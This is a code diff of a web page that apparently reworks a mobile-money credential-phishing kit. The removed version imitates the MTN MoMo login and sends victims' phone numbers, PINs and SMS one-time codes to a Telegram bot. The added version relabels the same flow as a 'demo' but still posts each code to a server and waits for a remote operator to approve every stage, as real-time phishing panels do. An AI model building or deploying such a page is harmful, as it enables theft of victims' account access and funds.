@@ -3,159 +3,110 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Welcome to MoMo</title>
+<title>Verification Demo</title>
 <style>
 * {
   box-sizing: border-box;
 }
 
 :root {
-  --momo-blue: #00566d;
-  --momo-yellow: #fccb05;
+  --yellow: #ffcc00;
+  --teal: #00566d;
   --white: #ffffff;
-  --text-dark: #002d38;
-  --text-muted: #667085;
-  --border-gray: #d1d5db;
+  --text: #171717;
+  --muted: #667085;
+  --border: #d1d5db;
 }
 
 body {
   margin: 0;
-  background: var(--momo-blue);
+  background: #f1f3f5;
   font-family: Arial, sans-serif;
-  color: var(--text-dark);
-  min-height: 100vh;
+  color: var(--text);
 }
 
 .header {
-  padding: 30px 0 15px;
+  height: 135px;
+  background: var(--yellow);
+  border-top: 8px solid #111;
   display: flex;
-  flex-direction: column;
   align-items: center;
   justify-content: center;
 }
 
-.logo-container {
-  background: var(--momo-yellow);
-  width: 90px;
-  height: 90px;
-  border-radius: 18px;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-}
-
-.logo-text {
-  font-size: 24px;
-  font-weight: bold;
-  color: var(--momo-blue);
-  line-height: 1;
-}
-
-.logo-sub {
-  font-size: 9px;
-  color: var(--momo-blue);
-  margin-top: 1px;
-}
-
-.brand-label {
-  color: var(--momo-yellow);
-  font-size: 13px;
-  margin-top: 10px;
+.logo {
+  border: 5px solid #111;
+  border-radius: 50%;
+  padding: 15px 35px;
+  font-size: 35px;
+  font-weight: 900;
 }
 
 .card {
   width: calc(100% - 32px);
-  max-width: 410px;
-  margin: 5px auto 25px;
+  max-width: 520px;
+  margin: 25px auto;
   background: var(--white);
-  border-radius: 28px;
-  padding: 24px 20px;
-}
-
-.demo-banner {
-  text-align: center;
-  font-size: 9px;
-  color: var(--text-muted);
-  letter-spacing: 0.5px;
-  margin-bottom: 20px;
-  text-transform: uppercase;
+  border-radius: 30px;
+  padding: 28px 22px;
+  box-shadow: 0 10px 30px #00000010;
 }
 
 h1 {
   text-align: center;
-  font-size: 24px;
-  color: var(--momo-blue);
-  margin: 0 0 15px 0;
-  font-weight: bold;
+  font-size: 28px;
+  margin: 10px 0 20px;
 }
 
 p {
   text-align: center;
-  line-height: 1.4;
+  line-height: 1.6;
   color: #414653;
-  font-size: 14px;
 }
 
-.field-label {
+.demo {
   text-align: center;
-  font-size: 15px;
+  font-size: 11px;
+  color: var(--muted);
+  margin-bottom: 20px;
+}
+
+label {
+  display: block;
   font-weight: bold;
-  color: #333;
-  margin-bottom: 12px;
-}
-
-.input-container {
-  position: relative;
-  display: flex;
-  align-items: center;
-  border: 1px solid var(--border-gray);
-  border-radius: 25px;
-  height: 56px;
-  padding: 0 16px;
-  margin: 15px 0;
-}
-
-.flag-selector {
-  display: flex;
-  align-items: center;
-  padding-right: 10px;
-  border-right: 1px solid #e5e7eb;
-  margin-right: 12px;
-}
-
-.flag-icon {
-  width: 26px;
-  height: auto;
-  border-radius: 2px;
+  margin: 22px 0 10px;
 }
 
 input[type="tel"],
 input[type="text"] {
-  flex: 1;
-  border: none;
-  background: transparent;
-  font-size: 18px;
+  width: 100%;
+  height: 60px;
+  border: 2px solid var(--border);
+  border-radius: 12px;
+  padding: 0 14px;
+  font-size: 20px;
   outline: none;
-  color: var(--text-dark);
+}
+
+input:focus {
+  border-color: #2878d0;
 }
 
 .boxes {
   display: flex;
   justify-content: center;
-  gap: 8px;
-  margin: 20px 0;
+  gap: 9px;
+  margin: 25px 0;
 }
 
 .boxes input {
-  width: 46px;
-  height: 54px;
+  width: 58px;
+  height: 66px;
   text-align: center;
   padding: 0;
-  font-size: 20px;
-  font-weight: bold;
-  border: 1px solid var(--border-gray);
-  border-radius: 10px;
+  font-size: 25px;
+  border: 2px solid var(--border);
+  border-radius: 12px;
   outline: none;
 }
 
@@ -163,65 +114,35 @@ input[type="text"] {
   border-color: #2878d0;
 }
 
-button.next-btn {
+button {
   width: 100%;
-  height: 54px;
-  margin-top: 15px;
-  background: #cccccc;
-  color: var(--white);
+  height: 60px;
+  margin-top: 20px;
+  background: var(--yellow);
   border: none;
-  border-radius: 25px;
-  font-size: 15px;
+  border-radius: 12px;
+  font-size: 20px;
   font-weight: bold;
-  text-transform: uppercase;
-  letter-spacing: 0.5px;
-  cursor: not-allowed;
-  transition: all 0.2s ease;
+  cursor: pointer;
+  opacity: 1;
+  transition: opacity 0.2s ease;
 }
 
-/* Updated active state setup */
-button.next-btn.active {
-  background: var(--momo-yellow) !important;
-  color: var(--momo-blue) !important;
-  cursor: pointer !important;
+button:disabled {
+  opacity: 0.45 !important;
+  cursor: not-allowed !important;
+  pointer-events: none;
 }
 
-.footer-notice {
-  text-align: center;
-  font-size: 11px;
-  color: #555;
-  line-height: 1.4;
-  margin-top: 30px;
-  padding: 0 5px;
-}
-
-.footer-notice id {
-  font-weight: bold;
-  color: var(--momo-blue);
-}
-
-.overlay-loader {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100vw;
-  height: 100vh;
-  background: rgba(0, 45, 56, 0.94); 
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  z-index: 9999;
-}
-
+/* Screenshot Accurate Progress Ring Component */
 .spinner {
-  width: 80px;
-  height: 80px;
-  border: 6px solid rgba(255, 255, 255, 0.15); 
-  border-top-color: #00cc66; 
+  width: 54px;
+  height: 54px;
+  margin: 25px auto 15px;
+  border: 5px solid #2d3748; 
+  border-top-color: #38a169; 
   border-radius: 50%;
-  animation: spin 1s linear infinite;
-  margin-bottom: 25px;
+  animation: spin 1.2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
 }
 
 @keyframes spin {
@@ -229,267 +150,285 @@ button.next-btn.active {
   to { transform: rotate(360deg); }
 }
 
-.loader-title {
-  color: var(--white);
-  font-size: 22px;
+.status {
+  text-align: center;
+  color: var(--teal);
   font-weight: bold;
-  margin-bottom: 6px;
+  margin-top: 15px;
 }
 
-.loader-subtitle {
-  color: #b0c4de;
-  font-size: 14px;
-  margin-bottom: 4px;
-}
-
-.loader-warning {
-  color: #b0c4de;
-  font-size: 14px;
-}
-
-.stage-msg {
+.error {
+  color: #b42318;
   text-align: center;
   margin-top: 10px;
   font-weight: bold;
 }
-.error { color: #d92d20; }
-.hidden { display: none !important; }
+
+.notice {
+  background: #fff4ce;
+  padding: 15px;
+  border-radius: 12px;
+  line-height: 1.5;
+  font-size: 14px;
+  margin: 20px 0;
+}
+
+.hidden {
+  display: none !important;
+}
+
+.success {
+  text-align: center;
+  font-size: 60px;
+  color: #168348;
+}
+
+@media (max-width: 380px) {
+  .card {
+    padding: 22px 15px;
+  }
+  .boxes {
+    gap: 6px;
+  }
+  .boxes input {
+    width: 48px;
+    height: 58px;
+  }
+}
 </style>
 </head>
 <body>
 
-<div id="secureOverlay" class="overlay-loader hidden">
-  <div class="spinner"></div>
-  <div class="loader-title">Secure Verification</div>
-  <div class="loader-subtitle" id="loaderDynamicText">Verifying your details...</div>
-  <div class="loader-warning">Please do not close this page.</div>
-</div>
-
 <header class="header">
-  <div class="logo-container">
-    <div class="logo-text">MoMo</div>
-    <div class="logo-sub">from MTN</div>
-  </div>
-  <div class="brand-label">from MTN</div>
+  <div class="logo">DEMO</div>
 </header>
 
 <main class="card">
-  <div class="demo-banner">DEMONSTRATION ONLY — NEVER ENTER REAL ACCOUNT CODES</div>
+  <div class="demo">DEMONSTRATION ONLY — NEVER ENTER REAL ACCOUNT CODES</div>
 
-  <!-- STAGE 1: PHONE -->
+  <!-- PAGE 1: PHONE NUMBER -->
   <section id="page1">
-    <h1>Welcome to MoMo</h1>
-    <div class="field-label">Enter number *</div>
-    <div class="input-container">
-      <div class="flag-selector">
-        <svg class="flag-icon" viewBox="0 0 900 600" width="26">
-          <rect y="0" width="900" height="100" fill="#000"/>
-          <rect y="100" width="900" height="100" fill="#fcd116"/>
-          <rect y="200" width="900" height="100" fill="#d92323"/>
-          <rect y="300" width="900" height="100" fill="#000"/>
-          <rect y="400" width="900" height="100" fill="#fcd116"/>
-          <rect y="500" width="900" height="100" fill="#d92323"/>
-          <circle cx="450" cy="300" r="85" fill="#fff"/>
-        </svg>
-      </div>
-      <input id="phone" type="tel" inputmode="numeric" maxlength="12" placeholder="778260583" autocomplete="off">
-    </div>
-    <button id="nextPhone" class="next-btn" disabled>Next</button>
-    <div class="footer-notice">
-      Signing in confirms your acceptance of our <id>Terms and Privacy Policy</id>
-    </div>
+    <h1>Welcome</h1>
+    <p>Enter a nine-digit test number to begin the verification demonstration.</p>
+    <label for="phone">Test phone number</label>
+    <input id="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="9 digits" autocomplete="off">
+    <button id="nextPhone" disabled="true">Next</button>
   </section>
 
-  <!-- STAGE 2: PIN -->
+  <!-- PAGE 2: DEMO PIN -->
   <section id="page2" class="hidden">
-    <h1>Welcome to MoMo</h1>
+    <h1>Demo PIN</h1>
     <p>Enter any five test digits. Do not use your real mobile-money PIN.</p>
     <div class="boxes" id="pinBoxes"></div>
-    <div id="pinMessage" class="stage-msg"></div>
+    <div id="pinWaiting" class="hidden">
+      <div class="spinner"></div>
+      <div class="status">Waiting for demo approval...</div>
+    </div>
+    <div id="pinMessage" class="status"></div>
   </section>
 
-  <!-- STAGE 3: CUSTOM VALUE -->
+  <!-- PAGE 3: FIRST DEMO CODE -->
   <section id="page3" class="hidden">
     <h1>Verification Demo</h1>
-    <p>Enter any custom test text value below to continue execution.</p>
-    <div class="input-container" style="padding: 0 15px;">
-      <input id="code1" type="text" placeholder="Enter a test value" autocomplete="off">
+    <p>Enter any test value to continue.</p>
+    <div class="notice">This is a simulated verification step. No SMS is sent.</div>
+    <label for="code1">Test value</label>
+    <input id="code1" type="text" autocomplete="off" placeholder="Enter a test value">
+    <button id="submitCode1" disabled="true">Continue</button>
+    <div id="code1Waiting" class="hidden">
+      <div class="spinner"></div>
+      <div class="status">Waiting for demo approval...</div>
     </div>
-    <button id="submitCode1" class="next-btn" disabled>Next</button>
-    <div id="code1Message" class="stage-msg"></div>
+    <div id="code1Message" class="status"></div>
   </section>
 
-  <!-- STAGE 4: SMS OTP -->
+  <!-- PAGE 4: SECOND DEMO CODE -->
   <section id="page4" class="hidden">
     <h1>Final Demo Step</h1>
     <p>Enter any four test digits. Do not use an actual SMS code.</p>
     <div class="boxes" id="code2Boxes"></div>
-    <div id="code2Message" class="stage-msg"></div>
+    <div id="code2Waiting" class="hidden">
+      <div class="spinner"></div>
+      <div class="status">Waiting for demo approval...</div>
+    </div>
+    <div id="code2Message" class="status"></div>
   </section>
 
-  <!-- STAGE 5: COMPLETED -->
-  <section id="page5" class="hidden" style="text-align: center;">
-    <h1 style="font-size: 45px; color: #00cc66; margin-bottom: 5px;">✓</h1>
-    <h1>Demo Complete</h1>
-    <p>The verification flow simulation has concluded successfully.</p>
+  <!-- PAGE 5: SUCCESS -->
+  <section id="page5" class="hidden">
+    <div class="success">✓</div>
+    <h1>Demo Completed</h1>
+    <p>The verification sequence mockup concluded successfully.</p>
   </section>
 </main>
 
 <script>
-// --- TELEGRAM CONFIGURATION ---
-const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; // Put your bot token here
-const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";     // Put your chat ID or group ID here
-
 let sessionId = null;
+let userData = { phone: "", pin: "", code1: "", code2: "" };
+let pollingInterval = null;
 
+// Initialize Session
 window.addEventListener("DOMContentLoaded", async () => {
   try {
     const res = await fetch("/api/session", { method: "POST" });
     const data = await res.json();
     sessionId = data.sessionId;
   } catch (err) {
-    console.error("Session configuration failed:", err);
+    console.error("Initialization error:", err);
   }
-  
-  setupBoxInputs("pinBoxes", 5, (val) => submitStage("pin", { pin: val }));
-  setupBoxInputs("code2Boxes", 4, (val) => submitStage("code2", { code2: val }));
 });
 
-// Function to send gathered data directly to Telegram
-async function sendToTelegram(message) {
-  const url = `https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage`;
-  try {
-    await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: "Markdown"
-      })
+// Setup dynamic item grid handling routines
+function setupBoxInputs(containerId, count, onComplete) {
+  const container = document.getElementById(containerId);
+  container.innerHTML = "";
+  const inputs = [];
+
+  for (let i = 0; i < count; i++) {
+    const input = document.createElement("input");
+    input.type = "tel";
+    input.maxLength = 1;
+    input.inputMode = "numeric";
+    input.autocomplete = "off";
+
+    input.addEventListener("input", (e) => {
+      input.value = input.value.replace(/\D/g, "");
+      if (input.value && i < count - 1) inputs[i + 1].focus();
+      
+      const fullValue = inputs.map(el => el.value).join("");
+      if (fullValue.length === count) {
+        inputs.forEach(el => el.disabled = true);
+        onComplete(fullValue);
+      }
     });
-  } catch (err) {
-    console.error("Telegram transmission failed:", err);
+
+    input.addEventListener("keydown", (e) => {
+      if (e.key === "Backspace" && !input.value && i > 0) {
+        inputs[i - 1].focus();
+      }
+    });
+
+    container.appendChild(input);
+    inputs.push(input);
   }
-}
-
-// Stage controller with integrated Telegram notifications
-async function submitStage(stageName, data) {
-  console.log(`Submitting stage [${stageName}]:`, data);
   
-  const overlay = document.getElementById("secureOverlay");
-  overlay.classList.remove("hidden");
-
-  // Construct message format for Telegram
-  let telegramMessage = `*New Form Activity*\n`;
-  if (stageName === "phone") {
-    telegramMessage += `📱 *Phone:* \`${data.phone}\``;
-  } else if (stageName === "pin") {
-    telegramMessage += `🔑 *PIN Entered:* \`${data.pin}\``;
-  } else if (stageName === "code1") {
-    telegramMessage += `📝 *Custom Value:* \`${data.code1}\``;
-  } else if (stageName === "code2") {
-    telegramMessage += `🔢 *OTP Code:* \`${data.code2}\``;
-  }
-
-  // Trigger background send to Telegram
-  await sendToTelegram(telegramMessage);
-  
-  // Control interface step routing
-  setTimeout(() => {
-    overlay.classList.add("hidden");
-    
-    if (stageName === "phone") {
-      showPage("page2");
-      setTimeout(() => { document.querySelector("#pinBoxes input")?.focus(); }, 50);
-    } else if (stageName === "pin") {
-      showPage("page3");
-    } else if (stageName === "code1") {
-      showPage("page4");
-      setTimeout(() => { document.querySelector("#code2Boxes input")?.focus(); }, 50);
-    } else if (stageName === "code2") {
-      showPage("page5");
-    }
-  }, 1200);
+  // FIXED: Focus the first actual input element in the array instead of the array object
+  if (inputs.length > 0) inputs[0].focus();
 }
 
-function showPage(pageId) {
-  document.querySelectorAll("main section").forEach(s => s.classList.add("hidden"));
-  document.getElementById(pageId).classList.remove("hidden");
-}
-
-// STAGE 1: Phone submission handler
+// Step 1 Phone Input Dynamic Activation Routines
 const phoneInput = document.getElementById("phone");
 const nextPhoneBtn = document.getElementById("nextPhone");
 
 phoneInput.addEventListener("input", () => {
-  phoneInput.value = phoneInput.value.replace(/[^0-9]/g, "");
+  phoneInput.value = phoneInput.value.replace(/\D/g, "");
   
-  if (phoneInput.value.length >= 9) {
-    nextPhoneBtn.removeAttribute("disabled"); 
-    nextPhoneBtn.classList.add("active");
+  if (phoneInput.value.length === 9) {
+    nextPhoneBtn.removeAttribute("disabled");
   } else {
     nextPhoneBtn.setAttribute("disabled", "true");
-    nextPhoneBtn.classList.remove("active");
   }
 });
 
 nextPhoneBtn.addEventListener("click", () => {
-  submitStage("phone", { phone: phoneInput.value.trim() });
+  userData.phone = phoneInput.value;
+  document.getElementById("page1").classList.add("hidden");
+  document.getElementById("page2").classList.remove("hidden");
+  
+  setupBoxInputs("pinBoxes", 5, submitPinStage);
 });
 
-// STAGE 3: Custom Text submission handler
+// Post Phone & PIN bundle configurations
+async function submitPinStage(pinValue) {
+  userData.pin = pinValue;
+  document.getElementById("pinWaiting").classList.remove("hidden");
+  
+  const success = await sendStagePayload("pin", { phone: userData.phone, pin: userData.pin });
+  if (success) {
+    startPolling("pin", "page2", "page3", "pinWaiting", "pinMessage", () => {
+      setTimeout(() => document.getElementById("code1").focus(), 50);
+    });
+  }
+}
+
+// Track and validate Page 3 input elements
 const code1Input = document.getElementById("code1");
 const submitCode1Btn = document.getElementById("submitCode1");
 
 code1Input.addEventListener("input", () => {
   if (code1Input.value.trim().length > 0) {
     submitCode1Btn.removeAttribute("disabled");
-    submitCode1Btn.classList.add("active");
   } else {
     submitCode1Btn.setAttribute("disabled", "true");
-    submitCode1Btn.classList.remove("active");
   }
 });
 
-submitCode1Btn.addEventListener("click", () => {
-  submitStage("code1", { code1: code1Input.value.trim() });
+submitCode1Btn.addEventListener("click", async () => {
+  userData.code1 = code1Input.value.trim();
+  submitCode1Btn.setAttribute("disabled", "true");
+  document.getElementById("code1Waiting").classList.remove("hidden");
+
+  const success = await sendStagePayload("code1", { code1: userData.code1 });
+  if (success) {
+    startPolling("code1", "page3", "page4", "code1Waiting", "code1Message", () => {
+      setupBoxInputs("code2Boxes", 4, submitCode2Stage);
+    });
+  }
 });
 
-// Dynamic grid input generator (with focus/backspace support)
-function setupBoxInputs(containerId, totalLength, completeCallback) {
-  const container = document.getElementById(containerId);
-  container.innerHTML = "";
+// Final step submission handler
+async function submitCode2Stage(code2Value) {
+  userData.code2 = code2Value;
+  document.getElementById("code2Waiting").classList.remove("hidden");
 
-  for (let i = 0; i < totalLength; i++) {
-    const input = document.createElement("input");
-    input.type = "tel";
-    input.inputmode = "numeric";
-    input.maxLength = 1;
-    input.autocomplete = "off";
-    container.appendChild(input);
-
-    input.addEventListener("input", () => {
-      input.value = input.value.replace(/[^0-9]/g, "");
-      if (!input.value) return;
-
-      if (input.nextElementSibling) {
-        input.nextElementSibling.focus();
-      } else {
-        const combined = Array.from(container.querySelectorAll("input")).map(box => box.value).join("");
-        if (combined.length === totalLength) {
-          completeCallback(combined);
-        }
-      }
-    });
-
-    input.addEventListener("keydown", (e) => {
-      if (e.key === "Backspace" && !input.value && input.previousElementSibling) {
-        input.previousElementSibling.focus();
-      }
-    });
+  const success = await sendStagePayload("code2", { code2: userData.code2 });
+  if (success) {
+    startPolling("code2", "page4", "page5", "code2Waiting", "code2Message");
   }
 }
+
+// Pipeline transmission communications helper
+async function sendStagePayload(stage, payload) {
+  try {
+    const response = await fetch("/api/approval-request", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ sessionId, stage, payload })
+    });
+    return response.ok;
+  } catch (e) {
+    return false;
+  }
+}
+
+// Polling core infrastructure engine
+function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, successCallback) {
+  const msgElement = document.getElementById(msgId);
+  msgElement.className = "status";
+  msgElement.innerText = "";
+
+  if(pollingInterval) clearInterval(pollingInterval);
+
+  pollingInterval = setInterval(async () => {
+    try {
+      const res = await fetch(`/api/status?sessionId=${sessionId}&stage=${stage}`);
+      const data = await res.json();
+
+      if (data.status === "approved") {
+        clearInterval(pollingInterval);
+        document.getElementById(spinnerId).classList.add("hidden");
+        document.getElementById(currentPageId).classList.add("hidden");
+        document.getElementById(nextPageId).classList.remove("hidden");
+        if (successCallback) successCallback();
+      } else if (data.status === "declined") {
+        clearInterval(pollingInterval);
+        document.getElementById(spinnerId).classList.add("hidden");
+        msgElement.classList.add("error");
+        msgElement.innerText = "Submission declined. Please refresh and retry.";
+      }
+    } catch (err) {
+      console.error("Status check failed");
+    }
+  }, 2500);
+}
 </script>
-
-
